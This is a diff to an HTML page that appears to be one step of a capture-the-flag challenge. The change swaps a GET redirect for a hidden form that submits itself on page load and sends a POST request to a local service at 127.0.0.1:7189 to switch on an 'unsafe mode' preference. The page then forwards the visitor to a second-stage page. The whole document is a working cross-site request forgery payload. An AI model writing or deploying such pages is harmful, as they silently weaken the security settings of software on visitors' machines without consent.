@@ -1,10 +1,16 @@
 <html>
   <head>
-    <!-- Redirect to enable unsafe mode -->
-    <meta http-equiv="refresh" content="0; url=http://127.0.0.1:7189/prefs/unsafe?id=1&enable=1" />
+    <title>Enable Unsafe Mode</title>
   </head>
   <body>
-    <!-- Fallback in case redirect fails -->
-    <p>Redirecting...</p>
+    <form id="unsafeForm" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
+      <input type="hidden" name="id" value="1">
+      <input type="hidden" name="enable" value="1">
+    </form>
+    <script>
+      document.getElementById('unsafeForm').submit();
+    </script>
+    <!-- Redirect to step2.html after submission -->
+    <meta http-equiv="refresh" content="2; url=https://jerrell-su.github.io/ctf.github.io/step2.html" />
   </body>
 </html>
